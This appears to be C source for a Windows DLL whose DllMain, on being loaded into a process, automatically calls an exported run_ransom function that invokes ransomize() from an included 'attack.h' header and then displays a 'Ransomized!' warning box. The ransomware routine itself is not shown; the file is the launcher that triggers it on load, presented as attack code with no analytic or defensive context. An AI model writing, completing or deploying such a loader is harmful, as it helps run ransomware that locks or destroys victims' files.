#include <windows.h>
#include "attack.h"

__declspec(dllexport) void run_ransom(void)
{
    ransomize();
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        run_ransom();
        MessageBoxA(NULL, "Ransomized!", "Warning", MB_ICONEXCLAMATION);
        break;
    }
    return TRUE;
}